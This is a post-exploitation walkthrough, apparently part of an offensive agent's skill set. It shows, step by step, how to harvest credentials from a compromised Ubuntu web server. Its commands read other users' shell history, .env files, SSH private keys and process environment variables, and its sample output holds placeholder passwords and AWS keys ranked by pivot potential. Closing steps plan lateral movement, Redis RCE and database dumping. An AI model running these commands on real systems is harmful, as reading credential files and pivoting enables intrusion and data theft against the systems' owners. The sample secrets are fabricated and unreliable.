# Linux Credential Hunting Workflow

## Scenario
Shell as `www-data` on Ubuntu web server, hunting for credentials to escalate or pivot.

## Step 1: History Files
```bash
www-data@webserver:~$ find /home -name ".*history" -readable 2>/dev/null
/home/deploy/.bash_history

www-data@webserver:~$ cat /home/deploy/.bash_history
ls -la
cd /opt/webapp
mysql -u root -pR00tDB!2024 megacorp_db
scp backup.tar.gz admin@10.10.10.50:/backups/
ssh admin@10.10.10.50
export AWS_ACCESS_KEY_ID=AKIA3EXAMPLEKEYID
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY
aws s3 sync s3://megacorp-backups /opt/backups/
sudo systemctl restart nginx
```

## Step 2: Configuration Files
```bash
www-data@webserver:~$ cat /var/www/html/.env
APP_ENV=production
APP_KEY=base64:abc123def456ghi789jkl012mno345pqr=
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=megacorp_app
DB_USERNAME=webapp_user
DB_PASSWORD=W3bApp#Pr0d2024!
REDIS_HOST=10.10.10.25
REDIS_PASSWORD=R3d1s!Cache2024
MAIL_PASSWORD=SmtpP@ss123
AWS_ACCESS_KEY_ID=AKIA3EXAMPLEKEYID2
AWS_SECRET_ACCESS_KEY=aB3cD4eF5gH6iJ7kL8mN9oP0qR1sT2uV3
```

## Step 3: SSH Keys
```bash
www-data@webserver:~$ find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
/home/deploy/.ssh/id_rsa

www-data@webserver:~$ cat /home/deploy/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
c2gtZWQyNTUxOQAAACBq8K2h+3mVbPHn7T8UNKfs3bxw4M0T6A...
-----END OPENSSH PRIVATE KEY-----

www-data@webserver:~$ cat /home/deploy/.ssh/known_hosts
10.10.10.50 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN7K...
10.10.10.51 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBxM...
10.10.10.100 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHvQ...
```

## Step 4: Process Environment Variables
```bash
www-data@webserver:~$ cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|key|secret|token' | sort -u
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY
DB_PASSWORD=W3bApp#Pr0d2024!
REDIS_PASSWORD=R3d1s!Cache2024
```

## Credentials Discovered

| Source | Credential | Type | Pivot Potential |
|--------|-----------|------|-----------------|
| .bash_history | MySQL root: R00tDB!2024 | Plaintext | Database access, credential reuse |
| .bash_history | AWS keys (AKIA3...) | API Key | Cloud lateral movement |
| .env | DB webapp_user: W3bApp#Pr0d2024! | Plaintext | Database access |
| .env | Redis: R3d1s!Cache2024 | Plaintext | Redis RCE potential |
| .env | SMTP: SmtpP@ss123 | Plaintext | Email access |
| .env | AWS keys (AKIA3...2) | API Key | Cloud lateral movement |
| .ssh/id_rsa | deploy SSH key (no passphrase) | Private Key | SSH to 10.10.10.50, .51, .100 |
| known_hosts | 3 internal hosts | Infrastructure | Attack surface mapping |

## Next Steps
→ **lateral_movement skill**: SSH as deploy to 10.10.10.50 (confirmed in history)
→ **lateral_movement skill**: AWS credential validation and enumeration
→ **exploitation skill**: Redis unauthenticated → RCE on 10.10.10.25
→ **credential_access skill**: MySQL root access → dump all databases
